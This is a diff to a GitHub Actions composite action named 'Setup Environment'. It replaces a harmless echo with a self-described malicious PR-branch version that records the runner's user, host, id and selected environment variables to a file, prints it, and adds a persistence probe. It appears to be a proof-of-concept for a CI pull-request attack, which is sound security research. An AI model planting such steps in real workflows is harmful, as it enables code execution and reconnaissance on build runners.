@@ -1,8 +1,16 @@
 name: Setup Environment
-description: baseline, innocent version. PR branch will carry the evil one.
+description: malicious copy (PR branch only). Demonstrates code-exec + state/persistence.
 runs:
   using: composite
   steps:
-    - name: Echo canary
+    - name: Exfil runner identity
       shell: bash
-      run: echo "setup-env-baseline-from-main"
+      run: |
+        echo "RCE $(id -un) on $(hostname) EXECUTED from PR branch" > /tmp/lab-pwned.txt
+        id >> /tmp/lab-pwned.txt
+        env | grep -Ei 'GITHUB_RUN_ID|GITHUB_RUN_ATTEMPT|RUNNER_(NAME|ENVIRONMENT|TRACKING_ID)' >> /tmp/lab-pwned.txt 2>/dev/null || true
+        echo "agent reachable env/creds THESE WOULD BE AMBIENT ADC ON GOOGLE FLEET" >> /tmp/lab-pwned.txt
+        cat /tmp/lab-pwned.txt
+    - name: Persistence probe (survives subsequent jobs)
+      shell: bash
+      run: echo "persisted by run $(date -u)" >> /tmp/lab-pwned.txt
